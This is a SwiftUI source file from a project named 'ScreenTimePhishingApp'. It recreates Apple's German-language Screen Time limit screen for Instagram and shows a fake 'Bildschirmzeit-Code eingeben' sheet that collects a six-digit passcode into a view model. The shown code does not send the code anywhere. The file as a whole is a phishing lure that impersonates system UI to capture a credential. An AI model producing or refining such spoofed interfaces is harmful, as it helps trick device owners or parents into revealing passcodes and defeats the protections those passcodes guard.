//
//  StartView.swift
//  ScreenTimePhishingApp
//
//  Created by Lasse von Pfeil on 31.10.22.
//

import SwiftUI



struct BottomButtons: View {
    
    @State var alertIsShown = false
    @State var showSheet = false
    
    
    @StateObject var otpModel: OTPViewModel = .init()
    
    
    @FocusState var active: OTPField?
    
    
    
    var body: some View {
        Button(action: {
            exit(0);
        }, label: {
            Text("OK")
                .padding(.trailing, 75)
                .padding(.leading, 75)
                .padding(.top, 15)
                .padding(.bottom, 15)
                .foregroundColor(.white)
                .background(.blue)
                .cornerRadius(25)
        })
        
        Button(action: {
            alertIsShown = true
        }, label: {
            Text("Mehr Zeit anfordern")
                .padding(.bottom, 15)
                .padding(.top, 6)
        })
        .confirmationDialog("ScreenTime select", isPresented: $alertIsShown) {
            Button("Anfrage senden") { }
            Button("Bildschirmzeit-Code eingeben") { showSheet = true }
        }
        .sheet(isPresented: $showSheet) {
            VStack {
                HStack {
                    Text("Code eingeben")
                        .fontWeight(.medium)
                        .position(x: 190, y: 25)
                    
                    Button(action: {
                        showSheet.toggle()
                    }, label: {
                        Text("Abbrechen")
                    })
                    .position(x: 125, y: 25)
                }
                
                
                Text("Bildschirmzeit-Code eingeben")
                    .fontWeight(.medium)
                    .padding()
                    .position(x: 185, y: -120)
                
                
                OTPField()
                    .onChange(of: otpModel.otpfields) { newValue in
                        OTPCondition(value: newValue)
                    }
            }
        }
    }
    
    
    func checkStates() -> Bool {
        for index in 0..<6 {
            if otpModel.otpfields[index].isEmpty{return true}
        }
        
        return false
    }
    
    
    func OTPCondition(value: [String]) {
        
        for index in 0..<5 {
            if value[index].count == 1 && activeStateForIndex(index: index) == active {
                active = activeStateForIndex(index: index + 1)
            }
        }
        
        for index in 1...5 {
            if value[index].isEmpty && !value[index - 1].isEmpty {
                active = activeStateForIndex(index: index - 1)
            }
        }
        
        for index in 0..<6 {
            if value[index].count > 1 {
                otpModel.otpfields[index] = String(value[index].last!)
            }
        }
    }
    
    @ViewBuilder
    func OTPField() -> some View {
        HStack (spacing: 14) {
            ForEach(0..<6, id: \.self) { index in
                VStack (spacing: 8) {
                    TextField("", text: $otpModel.otpfields[index])
                        .keyboardType(.numberPad)
                        .textContentType(.oneTimeCode)
                        .multilineTextAlignment(.center)
                        .focused($active, equals: activeStateForIndex(index: index))
                    
                    Rectangle()
                        .fill(active == activeStateForIndex(index: index) ? .blue : .gray.opacity(0.3))
                        .frame(height: 4)
                }
                .frame(width: 40)
            }
        }
    }
    
    func activeStateForIndex(index: Int) -> OTPField {
        switch index {
        case 0: return .field1
        case 1: return .field2
        case 2: return .field3
        case 3: return .field4
        case 4: return .field5
        default: return .field6
        }
    }
}


struct MiddleText: View {
    var body: some View {
        VStack {
            Image("ScreenTimeLogoImage")
                .resizable()
                .frame(width: 60, height: 110)
            
            Text("Du hast dein Limit für")
            Text("\"Instagram\" erreicht.")
        }
    }
}


struct StartView: View {
    
    
    var body: some View {
        VStack {
            Spacer()
            
            MiddleText()
            
            Spacer()
            
            BottomButtons()
        }
        .frame(maxWidth: .infinity, maxHeight: .infinity)
        .background(Color("Background1"))
    }
}


struct StartView_Previews: PreviewProvider {
    static var previews: some View {
        StartView()
    }
}


enum OTPField {
    case field1
    case field2
    case field3
    case field4
    case field5
    case field6
}
